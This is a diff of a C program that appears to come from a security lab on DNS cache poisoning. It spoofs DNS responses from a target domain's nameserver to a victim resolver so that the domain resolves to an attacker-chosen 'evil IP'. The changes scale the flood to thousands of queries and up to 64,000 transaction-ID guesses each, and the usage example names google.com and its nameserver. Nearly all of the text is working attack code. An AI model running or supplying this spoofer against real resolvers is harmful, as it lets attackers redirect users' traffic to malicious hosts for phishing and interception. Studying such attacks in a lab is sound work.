@@ -1,14 +1,3 @@
-// ----udp.c------
-// This sample program must be run by root lol! 
-// 
-// The program is to spoofing tons of different queries to the victim.
-// Use wireshark to study the packets. However, it is not enough for 
-// the lab, please finish the response packet and complete the task.
-//
-// Compile command:
-// gcc -lpcap udp.c -o udp
-//
-// 
 #include <unistd.h>
 #include <stdio.h>
 #include <sys/socket.h>
@@ -18,7 +7,6 @@
 #include <string.h>
 #include <errno.h>
 #include <stdlib.h>
-#include <libnet.h>
 #include <arpa/inet.h>
 #include <time.h>
 
@@ -26,12 +14,6 @@
 #define FLAG_R 0x8400
 #define FLAG_Q 0x0100
      
-
-
-// Can create separate header file (.h) for all headers' structure
-
-// The IP header's structure
-
 struct ipheader {
     unsigned char      iph_ihl:4, iph_ver:4;
     unsigned char      iph_tos;
@@ -320,7 +302,6 @@ unsigned int generate_dns_answer (
     char *dst_buffer,
     unsigned short **txid_ptr) 
 {
-
     char *buffer = dst_buffer;
     // Our own headers' structures
     struct ipheader *ip = (struct ipheader *) buffer;
@@ -345,7 +326,10 @@ unsigned int generate_dns_answer (
     //standart response
 	dns->flags=htons(FLAG_R);
     //Random transaction ID
-    dns->query_id=rand();
+    //dns->query_id=rand();
+
+    //TXID start from
+    dns->query_id = 0;
 
     *txid_ptr = &(dns->query_id);
 
@@ -392,7 +376,7 @@ unsigned int generate_dns_answer (
 
 
 
-int main(int argc, char *argv[])
+int main(int argc, char **argv)
 {
     // socket descriptor
     int sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
@@ -400,15 +384,17 @@ int main(int argc, char *argv[])
     if(sd<0 ) // if socket fails to be created 
         printf("socket error\n");
 
-    if(argc != 6) {
+    if(argc != 8) {
         printf("Usage: \
             \n\tSRC IP (your computer), \
             \n\tDST IP (victim nameserver) , \
             \n\tTARGET DOMAIN'S NAMESERVER (example: ns1.BankOfShlomi.com) \
             \n\tTARGET DOMAIN'S NAMESERVER IP (IP of ns1.BankOfShlomi.com \
             \n\tEVIL IP (the victim will store this IP, it should be evil) \
+            \n\tQUERY COUNT (xxx.example.com where xxxx is 0 to 9999) \
+            \n\tANSWER COUNT PER QUERY (TXID GUESS - max is 64000)\
             \nExample: \
-            \n\tsudo ./a.out 127.0.0.1 127.0.0.1 google.com ns1.google.com 216.239.32.10 6.6.6.6 \
+            \n\tsudo ./a.out 127.0.0.1 127.0.0.1 google.com ns1.google.com 216.239.32.10 6.6.6.6 9999 64000\
             \n");
         //You can use DIG tool (dig NS google.com) to find name servers
         exit(-1);
@@ -422,11 +408,28 @@ int main(int argc, char *argv[])
         exit(-1);
     }
 
-    char *src_ip = argv[1];
-    char *dst_ip = argv[2];
-    char *target_domain_nameserver = argv[3];
-    char *target_domain_nameserver_ip = argv[4];
-    char *evil_ip = argv[5];
+    //Parse argv
+    const char *src_ip = argv[1];
+    const char *dst_ip = argv[2];
+    const char *target_domain_nameserver = argv[3];
+    const char *target_domain_nameserver_ip = argv[4];
+    const char *evil_ip = argv[5];
+    const char *str_query_count = argv[6];
+    const char *str_guesses = argv[7];
+
+    const int query_count = atoi(str_query_count);
+    const int guesses = atoi(str_guesses);
+
+    if(query_count > 9999) {
+        perror("Query count maximum is 9999");
+        exit(1);
+    }
+
+    if(guesses > 64000) {
+        perror("Guesses maximum is 64000");
+        exit(1);
+    }
+
 
     struct sockaddr_in sin, din;
 
@@ -448,7 +451,7 @@ int main(int argc, char *argv[])
     unsigned int packet_len = 0;
 
     //Pointer to the DNS TXID field (to change it later)
-    unsigned short *txid_ptr; //points to buffer
+    unsigned short *txid_ptr; //points to buffer's txid
 
     char query[18];
     strcpy(query, "\4????\7example\3com");
@@ -457,7 +460,8 @@ int main(int argc, char *argv[])
 
 
 
-    for(int i = 0; i < 2; i++) {
+    //Query loop (amount of queries to ask)
+    for(int i = 0; i < query_count; i++) {
         memset(buffer, 0, PCKT_LEN);
 
         //randomize query (first 4 chars of first label)
@@ -481,12 +485,18 @@ int main(int argc, char *argv[])
         packet_len = generate_dns_answer(target_domain_nameserver_ip, dst_ip, query, evil_ip, buffer, &txid_ptr);
 
         printf("Sending flood answer packets...\n");
-        for(int j = 0; j < 3; j++) {
-            if(sendto(sd, buffer, packet_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
+        //Guess loop (trying to guess TXID)
+        uint64_t bytes_sent = 0;
+        for(int j = 0; j < guesses; j++) {
+            if( (bytes_sent = sendto(sd, buffer, packet_len, 0, (struct sockaddr *)&sin, sizeof(sin))) < 0) {
                 printf("packet send error %d which means %s\n",errno,strerror(errno));
             }
-            printf("Sent!\n");
-            *txid_ptr = (*txid_ptr) + htons(1); //htons is very important! Big edian only!
+            printf("Sent %d bytes!\n", bytes_sent);
+            //*txid_ptr = (*txid_ptr) + htons(1); //htons is very important! Big edian only!
+            uint16_t tmp = ntohs(*txid_ptr);
+            printf("tmp = %d\n",tmp);
+            tmp += 1;
+            *txid_ptr = htons(tmp);
         }
     }
 
